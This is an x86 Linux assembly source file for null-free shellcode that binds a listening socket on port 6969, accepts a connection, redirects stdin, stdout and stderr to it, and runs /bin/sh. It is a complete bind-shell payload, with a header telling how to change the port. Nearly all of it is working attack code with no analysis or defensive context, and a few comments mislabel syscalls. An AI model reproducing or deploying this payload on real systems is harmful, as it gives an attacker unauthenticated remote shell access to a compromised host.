; non-NULL shellcode running /bin/sh and listening on port 6969
; -> change the port using Python:
;   $ python -c "import socket; print(hex(socket.htons(PORT)))"
; -> get a list of sys_socket calls
;   $ grep SYS_ /usr/include/linux/net.h
global _start
section .text

_start:
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int sock = socket(AF_INET, SOCK_STREAM, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor  eax, eax
  push eax       ; push 0
  inc  eax
  push eax       ; push SOCK_STREAM (1)
  inc  eax
  push eax       ; push AF_INET (2)
  mov  ecx, esp  ; ecx = pointer to args array
  mov  ebx, eax
  dec  ebx       ; ebx = SYS_SOCKET (1)
  mov  al, 0x66  ; eax = sys_socket number
  int  0x80      ; sys_socket(SYS_SOCKET, {AF_INET, SOCK_STREAM, 0})
  xchg esi, eax  ; store file descriptor in esi
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; struct sockaddr_in address
  ; address.sin_family = AF_INET
  ; address.sin_port = htons(PORT)
  ; address.sin_addr.s_addr = INADDR_ANY
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor  edx, edx               ; sizeof(struct sockaddr_in) = 16
  push edx
  push edx
  push edx
  push edx                    ; create 16 byte NULL buffer on stack
  mov  byte [esp], 0x2        ; store AF_INET at address.sin_family
  mov  word [esp + 2], 0x391b ; store PORT at address.sin_port
  mov  ecx, esp               ; ecx = &address on the stack
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; bind(sock, (struct sockaddr *)&address, sizeof(address))
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x10 ; push sizeof(struct sockaddr_in)
  push ecx       ; push (struct sockaddr *)&address
  push esi       ; push sock 
  mov  ecx, esp  ; ecx = pointer to args array
  push byte 0x66
  pop  eax       ; eax = sys_socket number
  inc  ebx       ; ebx = SYS_BIND (2)
  int  0x80      ; sys_socket(SYS_BIND, {sock, &address, 16})
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; listen(sock, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push edx       ; push NULL
  push esi       ; push sock file descriptor
  mov  ecx, esp  ; ecx = pointer to args array
  push byte 0x66
  pop  eax       ; eax = sys_socket number
  mov  bl, 0x4   ; ebx = SYS_LISTEN (4)
  int  0x80      ; sys_socket(SYS_LISTEN, {sock, NULL})
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int new_sock = accept(sock, NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push edx
  push edx
  push esi
  mov  ecx, esp  ; ecx = pointer to args array
  push byte 0x66
  pop  eax       ; eax = sys_socket number
  mov  bl, 0x5   ; ebx = SYS_ACCEPT (5)
  int  0x80      ; sys_socket(SYS_BIND, {sock, &address, 16})
  xchg ebx, eax  ; store client socket (new_sock) in ebx
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; dup(new_sock, 0)
  ; dup(new_sock, 1)
  ; dup(new_sock, 2)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x2
  pop  ecx       ; ecx = STDERR file descriptor number
dup:
  push byte 0x3f
  pop  eax       ; eax = sys_dup2 number
  int  0x80      ; dup(ebx, ecx)
  dec  ecx       ; cycle through STDIN and STDOUT descriptors
  jns  dup
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; execve("//bin/sh", NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor  ecx, ecx
  push edx        ; push NULL onto stack 
  push 0x68732f6e ; push 'n/sh'
  push 0x69622f2f ; push '//bi'
  mov  ebx, esp   ; get pointer to string on stack
  xor  eax, eax
  mov  al, 0xb    ; eax = sys_execve syscall number
  int  0x80
